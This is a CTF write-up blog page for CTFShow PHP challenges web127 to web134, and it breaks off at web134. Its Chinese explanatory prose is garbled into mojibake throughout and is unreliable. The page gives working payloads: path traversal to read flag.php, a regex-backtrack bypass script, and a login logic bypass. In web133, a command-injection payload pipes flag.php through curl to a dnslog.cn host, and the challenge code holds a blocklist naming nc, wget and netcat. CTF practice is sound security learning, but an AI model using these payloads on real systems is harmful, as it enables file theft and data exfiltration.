<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web127_1.png"></p>
<ul>
<li>ä»è¿”å›çš„ç»“æœæ¥çœ‹ï¼Œ$_SERVERçš„ç¡®åŒ…å«äº†æœåŠ¡å™¨çš„ä¸€äº›ä¿¡æ¯ï¼Œå…¶ä¸­ QUERY_STING é€šè¿‡GETæ–¹å¼ä¼ å…¥äº†ä¸€äº›å‚æ•°å¹¶ä¸”ä¹Ÿå°†å…¶è¿”å›äº†å‡ºæ¥å¦‚ä¸Šå›¾çº¢æ¡†å¤„æ ‡è®°ï¼Œå…¶å®è¿™å°±æ˜¯é€šè¿‡GETæ–¹å¼ä¼ å…¥äº†ä¸€ä¸ªå˜é‡ã€‚</li>
<li>ç»§ç»­å¾€ä¸‹çœ‹ç¨‹åºä»£ç ï¼šå‡½æ•°waf å¯¹ å˜é‡ url è¿‘äº›äº†è¿‡æ»¤ï¼›ç»§ç»­å¾€ä¸‹çš„ if åˆ¤æ–­ä¸­else: extract($_GET) è¿›è¡Œäº†å˜é‡è¦†ç›–ï¼Œè¿™é‡Œæ‰æ˜¯çœŸæ­£çš„å˜é‡è¦†ç›–ï¼Œé‚£å°±è¦ç»•è¿‡ waf çš„é˜»æ‹¦è®©å…¶ä¸º false ç„¶å if åˆ¤æ–­æ‰§è¡Œelseçš„å˜é‡è¦†ç›–ã€‚</li>
<li>å†å¾€ä¸‹æ‰§è¡Œä»£ç ï¼šå‘ç° å˜é‡ ctf_show å…¨ç­‰äº ilove36d, å˜¿å˜¿å˜¿ï¼Œè°ä¸å–œæ¬¢36Då•Š</li>
<li>ç»¼ä¸Šæ‰€è¿° åˆ©ç”¨å˜é‡è¦†ç›–è¾¾åˆ°ç›®çš„ã€‚</li>
<li>?ctf_show=ilove36d, æ­¤æ—¶ä¸è¡Œï¼Œå¯¹ä¸‹åˆ’çº¿è¿›è¡Œäº†è¿‡æ»¤ï¼Œå› ä¸ºPHPä¸­å˜é‡çš„ç»„æˆä¸ºï¼š å­—æ¯ï¼Œæ•°å­—ï¼Œä¸‹åˆ’çº¿ï¼Œæ•°å­—ä¸èƒ½å¼€å¤´ï¼Œå¦‚æœå˜é‡åæœ‰ <strong>ç‚¹</strong> å’Œ <strong>ç©ºæ ¼</strong> ä¼šå°†å…¶è‡ªåŠ¨è½¬æ¢ä¸º ä¸‹åˆ’çº¿ï¼Œé‚£ä¹ˆå¯ä»¥å¾—åˆ°: </li>
<li>?ctf show=ilove36d</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web127_2.png"></p>
<h2 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-10-10 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-12 19:49:05</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$f1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line"><span class="variable">$f2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(check(<span class="variable">$f1</span>))&#123;</span><br><span class="line">    var_dump(call_user_func(call_user_func(<span class="variable">$f1</span>,<span class="variable">$f2</span>)));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;å—¯å“¼ï¼Ÿ&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !preg_match(<span class="string">&#x27;/[0-9]|[a-z]/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æï¼š</strong></p>
<ul>
<li>è¿™é“é¢˜æ­£å¦‚é¢˜ç›®æè¿°ä¸€æ ·åˆæ˜¯ä¸ªä¸çŸ¥é“çš„<strong>éªšæ“ä½œ</strong> ğŸ‚ğŸº 666</li>
<li>é˜…è¯»ç¨‹åºä¸Šä¸‹æ–‡å‘ç°å¤´ä¸€æ¬¡è§ <strong>call_user_func()</strong> æŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°è°ƒç”¨ã€‚å…¶ä½™å‚æ•°æ˜¯å›è°ƒå‡½æ•°çš„å‚æ•°ï¼Œæ‰€ä»¥ $f1 ä¸ºä¸€ä¸ªå‡½æ•°ï¼Œ$f2 ä¸ºè¿™ä¸ªå‡½æ•°çš„å‚æ•°ã€‚</li>
<li>å†å¾€ä¸‹çœ‹ å®šä¹‰äº†ä¸€ä¸ª check() å‡½æ•°ï¼Œå¯¹ <strong>æ•°å­—å­—æ¯</strong>è¿›è¡Œäº†è¿‡æ»¤ã€‚</li>
<li>è¿™é“é¢˜çš„éªšæ“ä½œæ˜¯åˆ©ç”¨äº† gettext æŸ¥æ‰¾ php æ‰‹å†Œ</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web128.png"></p>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web128_1.png"></p>
<ul>
<li>å¦‚å›¾æ‰€ç¤º : æ‚¨å¯ä»¥ä½¿ç”¨ä¸‹åˆ’çº¿å­—ç¬¦â€œ_â€ä½œä¸ºæ­¤å‡½æ•°çš„åˆ«åã€‚ğŸ‚ğŸº 666</li>
<li>get_defined_varsï¼ˆï¼‰è¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰çš„å˜é‡æ‰€ç»„æˆçš„æ•°ç»„</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web128_2.png"></p>
<ul>
<li>?f1=_&amp;f2=get_defined_vars</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web128_3.png"></p>
<h2 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h2><p>æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-13 03:18:40</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(stripos(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> readfile(<span class="variable">$f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æï¼š</strong></p>
<ul>
<li><p>é˜…è¯»ç¨‹åºä¸Šä¸‹æ–‡ï¼Œä½¿ç”¨äº† <strong>stripos</strong>() å‡½æ•°ï¼šæŸ¥æ‰¾å­—ç¬¦ä¸²é¦–æ¬¡å‡ºç°çš„ä½ç½®ä¸åŒºåˆ†å¤§å°å†™ï¼Œä»0å¼€å§‹è®¡æ•°ã€‚ä¸ <a href="mk:@MSITStore:D:\MY-CODE\PHP\php7.3.8æ‰‹å†Œï¼ˆå®˜ç½‘ï¼‰\php7.3.8æ‰‹å†Œï¼ˆå®˜ç½‘ï¼‰\php7.3.8ï¼ˆå®˜ç½‘ä¸‹è½½ï¼‰.chm::/res/function.strpos.html">strpos()</a> ä¸åŒï¼Œ<strong>stripos()</strong> ä¸åŒºåˆ†å¤§å°å†™ã€‚</p>
</li>
<li><p>readfile() è¾“å‡ºæ–‡ä»¶ï¼Œè¯»å…¥çš„æ–‡ä»¶å</p>
</li>
<li><p>å¯ä»¥å¾—åˆ°: </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?f=/ctfshow../../../../<span class="keyword">var</span>/www/html/flag.php </span><br></pre></td></tr></table></figure></li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web129.png"></p>
<h2 id="web130"><a href="#web130" class="headerlink" title="web130"></a>web130</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-13 05:19:40</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(stripos(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æï¼š</strong></p>
<p>æºç :</p>
<p>é¦–å…ˆé˜…è¯»ç¨‹åºä¸Šä¸‹æ–‡ã€‚å‘ç°æ­£åˆ™åŒ¹é… <code>&#39;/.+?ctfshow/is&#39;</code> , iä¸åŒºåˆ†å¤§å°å†™ï¼Œ s åŒ¹é…æ¢è¡Œç¬¦ï¼Œ+ åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼ä¸€æ¬¡æˆ–å¤šæ¬¡ï¼Œï¼ŸåŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–ä¸€æ¬¡ï¼Œ. é»˜è®¤æƒ…å†µä¸‹çš„åœ†ç‚¹ <strong>.</strong> æ˜¯ åŒ¹é…é™¤æ¢è¡Œç¬¦ <strong>\n</strong> ä¹‹å¤–çš„ä»»ä½•å­—ç¬¦ï¼Œ</p>
<p>éœ€è¦æ³¨æ„ä¸­é—´çš„ ? (é—®å·) åœ¨ å­—ç¬¦ä¸²ctfshowå‰é¢å¿…é¡»æœ‰ä¸€ä¸ªæˆ–0ä¸ªå­—ç¬¦ï¼Œ åªå†™ ctfshow å³å¯ç»•è¿‡ã€‚</p>
<p>ç»§ç»­å¾€ä¸‹çœ‹ï¼Œstripos() å’Œä¸Šä¸€é¢˜ä¸€æ ·åŒ¹é…å­—ç¬¦ä¸² ctfshow é¦–æ¬¡å‡ºç°çš„ä½ç½®ï¼Œæ­¤å¤„ä¸ºä¸‰ä¸ªç­‰å· === å…¨ç­‰æ¯”è¾ƒæ•°å€¼å’Œç±»å‹ï¼Œå¦‚æœåŒ¹é…å‡ºå­—ç¬¦å‡ºé¦–æ¬¡å‡ºç°çš„ä½ç½®ä¸º 0 ï¼Œ0 (int)ï¼Œ ä¸ FALSE(bool) è‡ªç„¶ä¸æƒ³ç­‰å°±ç­‰ç»•è¿‡</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">post:</span><br><span class="line">f=ctfshow</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web130.png"></p>
<p>strpos &amp;&amp; stripos å¯ä»¥æ•°ç»„ç»•è¿‡ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">post:</span><br><span class="line">f[]=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web130_1.png"></p>
<p>æœ¬é¢˜æœ‰ä¸ªæç¤ºï¼švery very veryï¼ˆçœç•¥25ä¸‡ä¸ªveryï¼‰ctfshowï¼Œæ®è¯´æ­£åˆ™æœ€å¤šåŒ¹é…25wæ¬¡ï¼Œä¹‹åå°±ä¸è¡Œäº†ã€‚çœŸâ„¢<strong>éªš</strong></p>
<p>é‚£ä¹ˆå¯ä»¥å†™ä¸ªè„šæœ¬:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://e3081345-a5cb-4efc-a89c-3e4f4e66a000.challenge.ctf.show:8080/&#x27;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>:<span class="string">&#x27;very&#x27;</span>*<span class="number">250000</span>+<span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(url=url,data=data)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>

<p>postä¸­çš„å†…å®¹ very ç”Ÿæˆäº†25000æ¬¡ï¼Œè¶…è¿‡äº†æœ€å¤§å€¼ï¼Œè¿”å› <strong>false</strong> ï¼ŒåŒæ—¶å…¶ä¸­åŒ…å« å­—ç¬¦ä¸² <strong>ctfshow</strong> å°±ç»•è¿‡äº†ç¬¬äºŒä¸ª striposåˆ†æ”¯ï¼Œæœ€ç»ˆå¾—åˆ° falg</p>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web130_2.png"></p>
<h2 id="web131"><a href="#web131" class="headerlink" title="web131"></a>web131</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-13 05:19:40</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = (<span class="keyword">String</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(stripos(<span class="variable">$f</span>,<span class="string">&#x27;36Dctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æ:</strong></p>
<ul>
<li>å¯é‡‡ç”¨ä¸Šä¸€é¢˜è„šæœ¬:</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url =<span class="string">&#x27;http://f16472c2-b4b2-4983-8528-8630be8b0610.challenge.ctf.show:8080/&#x27;</span> </span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>:<span class="string">&#x27;very&#x27;</span>*<span class="number">250000</span>+<span class="string">&#x27;36Dctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(url=url,data=data)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web131.png"></p>
<h2 id="web132"><a href="#web132" class="headerlink" title="web132"></a>web132</h2><p>é¦–å…ˆæ‰“å¼€å‘ç°ä¸ºä¸€ä¸ª blog é¡µé¢ æ²¡æœ‰ä»€ä¹ˆå¯ç”¨ä¿¡æ¯ æ‰€ä»¥å°è¯•ç›®å½•çˆ†ç ´:</p>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web132.png"></p>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web132_1.png"></p>
<p>ä»çˆ†ç ´ç»“æœå¦‚ä¸Šå›¾æ‰€ç¤º,å…¶ä¸­ /admin/å¯ä»¥æ‰“å¼€ï¼ŒåŸæ¥æŠŠé¢˜ç›®è—åœ¨äº†è¿™ä¸ªé¡µé¢:</p>
<p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-10-13 06:22:13</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-13 20:05:36</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$code</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$code</span> === mt_rand(<span class="number">1</span>,<span class="number">0x36D</span>) &amp;&amp; <span class="variable">$password</span> === <span class="variable">$flag</span> || <span class="variable">$username</span> ===<span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$code</span> == <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æ:</strong></p>
<ul>
<li>é¦–å…ˆé˜…è¯»ç¨‹åºä¸Šä¸‹æ–‡ï¼Œå‘ç°æœ‰ä¸‰ä¸ª $_GET çš„å‚æ•°: username, password, code</li>
<li>ç„¶åç»§ç»­å¾€ä¸‹å¯ä»¥çœ‹åˆ° mt_rand(1,0x36D) è¿™ä¸ªå‡½æ•°çš„ä½œç”¨ æ˜¯ç”Ÿæˆéšæœºæ•°ä» 1-877 ï¼Œè¯¦æƒ…çœ‹æ‰‹å†Œ</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web132_2.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$code</span> === mt_rand(<span class="number">1</span>,<span class="number">0x36D</span>) &amp;&amp; <span class="variable">$password</span> === <span class="variable">$flag</span> || <span class="variable">$username</span> ===<span class="string">&quot;admin&quot;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>ä»è¿™æ¡ if è¯­å¥ å¯ä»¥çŸ¥é“ ä¸¤ä¸ªè¿ç®—ç¬¦ &amp;&amp; å’Œ || æ ¹æ®ä¼˜å…ˆçº§ æ·»åŠ æ‹¬å·ä½¿å¾—æ˜“äºç†è§£:</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( (<span class="variable">$code</span> === mt_rand(<span class="number">1</span>,<span class="number">0x36D</span>) &amp;&amp; <span class="variable">$password</span> === <span class="variable">$flag</span>) || (<span class="variable">$username</span> ===<span class="string">&quot;admin&quot;</span>))</span><br></pre></td></tr></table></figure>

<ul>
<li>è¿™ä¸ª if è¯­å¥ å­˜åœ¨ä¸¤ç§æƒ…å†µï¼Œ1:|| çš„å‰éƒ¨åˆ†(å·¦è¾¹) ä¸º TRUE  2: || çš„åéƒ¨åˆ†ä¸º(å³è¾¹) True, ä»è¿™é‡Œå¯ä»¥çŸ¥é“äº†ï¼Œè®©å‰é¢çš„è¡¨è¾¾å¼ä¸ºFALSE ï¼Œåé¢çš„è¡¨ç¤ºä¸º TRUE å°±å¯ä»¥ç»•è¿‡ éšæœºæ•°ã€‚æ˜¯çš„ç¨‹åºç»§ç»­å‘ä¸‹æ‰§è¡Œ:</li>
<li>ä¸‹ä¸€ä¸ª if çš„æ¡ä»¶ä¸º $code == â€˜adminâ€™ ã€</li>
<li>ç»¼ä¸Šæ‰€è¿°å¯ä»¥å¾—åˆ°: </li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?username=admin&amp;password=&amp;code=admin</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web132_3.png"></p>
<h2 id="web133"><a href="#web133" class="headerlink" title="web133"></a>web133</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-13 16:43:44</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(substr(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;6ä¸ªå­—æ¯éƒ½è¿˜ä¸å¤Ÿå‘€?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æ:</strong></p>
<ul>
<li>è¿™é“é¢˜å¯¹æˆ‘æ¥è¯´åˆæ˜¯ä¸€ä¸ªçŸ¥è¯†ç›²åŒºï¼Œåªæœ‰çœ‹çœ‹å¤§ä½¬æ–¹æ³•äº†:</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?F=`<span class="variable">$F</span>`; curl `cat flag.php | grep <span class="string">&quot;flag&quot;</span>`<span class="number">.9</span>b8kh6.dnslog.cn</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web133.png"></p>
<h2 id="web134"><a href="#web134" class="headerlink" title="web134"></a>web134</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-14 23:01:06</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$key1</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$key2</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nonononono&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@parse_str(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key1</span> == <span class="string">&#x27;36d&#x27;</span> &amp;&amp; <span class="variable">$key2</span> == <span class="string">&#x27;36d&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(file_get_contents(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æ:</strong></p>
<ul>
